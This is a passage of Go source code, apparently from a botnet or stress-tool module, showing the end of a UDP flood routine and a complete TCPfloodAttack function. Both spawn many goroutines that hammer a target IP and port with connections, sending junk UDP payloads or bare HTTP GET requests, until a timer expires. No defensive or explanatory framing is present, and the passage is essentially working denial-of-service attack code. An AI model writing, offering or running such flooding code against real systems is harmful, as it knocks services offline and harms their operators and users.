	var wg sync.WaitGroup
	payload := make([]byte, 1024)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write(payload)
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func TCPfloodAttack(targetIP string, targetPort, duration int) {
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}